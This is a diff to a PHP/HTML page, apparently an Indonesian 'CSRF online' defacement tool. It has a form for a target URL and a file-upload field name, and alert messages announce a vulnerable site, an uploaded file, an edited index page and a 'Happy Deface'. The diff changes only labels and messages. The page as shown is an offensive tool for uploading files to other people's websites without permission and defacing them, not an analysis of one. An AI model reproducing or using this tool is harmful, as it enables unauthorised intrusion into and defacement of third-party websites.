@@ -3,7 +3,7 @@
         <link rel="icon" type="image/jpg" href='https://seken.co.id/assets/uploads/post/Monkey-de-Luffy-One-Piece-81.jpg'/>
         <title># CSRF Onlen ScA</title>
 		 <iframe width="0%" height="0" scrolling="no" frameborder="no" loop="true" allow="autoplay" src="https://d.top4top.net/m_10932vbu71.mp3"></iframe>
-         <link type="text/css" href="http://anicrack-indo.netii.net/error.css" rel="stylesheet"> 
+         <link type="text/css" href="" rel="stylesheet"> 
          <link href="https://fonts.googleapis.com/css?family=Open+Sans+Condensed:300" rel="stylesheet" type="text/css">
          <link href="http://fonts.googleapis.com/css?family=Ubuntu+Mono:400,700" rel="stylesheet" type="text/css"> 
          <meta content='CSRF Online' name='title'/>
@@ -37,9 +37,9 @@
                                 <div style="display">		
                                                <center>
 <form method="post">
-<font face="Inconsolata" color="blue"> URL Target : </font> <font color="red"> ScA </font> <input type="text" name="url" placeholder="Your Target" style="margin: 5px auto; padding-left: 5px;" required>
+<font face="Inconsolata" color="blue"> Target Mu : </font> <font color="red"> ScA </font> <input type="text" name="url" placeholder="Your Target" style="margin: 5px auto; padding-left: 5px;" required>
 <br><br><font face="Inconsolata" color="blue"> Post File : </font> <font color="red">ScA </font><font color="black">-</font>  <input type="text" name="pf" size="50" height="10" placeholder="Filedata / files[] / qqfile / userfile / dll" required>
-<br><br><input type = "submit" name = "submit" value = "Target Key" class="login-input"style='width: 130px; height: 40px;'> </ form >
+<br><br><input type = "submit" name = "submit" value = "Kunci Target" class="login-input"style='width: 130px; height: 40px;'> </ form >
 </form>
 <?php
 $url = $_POST['url'];
@@ -49,10 +49,10 @@ if($d) {
 	echo "<SCRIPT language='JavaScript'>alert('Website Vuln Coy :V');</SCRIPT>";
     echo "<SCRIPT language='JavaScript'>alert('Upload File Luh');</SCRIPT>";
 	echo "<SCRIPT language='JavaScript'>alert(' Status : Terkunci');</SCRIPT>";
-    echo "<SCRIPT language='JavaScript'>alert('Akses Your File');</SCRIPT>";
+    echo "<SCRIPT language='JavaScript'>alert('Akses File Luh');</SCRIPT>";
     echo "<SCRIPT language='JavaScript'>alert('Edit Page Index Done');</SCRIPT>";
-    echo "<SCRIPT language='JavaScript'>alert('Miror -> Ok');</SCRIPT>";
-    echo "<SCRIPT language='JavaScript'>alert('Happy Deface';</SCRIPT>";
+    echo "<SCRIPT language='JavaScript'>alert('Soof > Miror -> Ok :v');</SCRIPT>";
+    echo "<SCRIPT language='JavaScript'>alert('Happy Deface :v';</SCRIPT>";
     echo " <div id='preloader'> ";
     echo " <div id='loading'> ";
     echo " </div> </div> ";
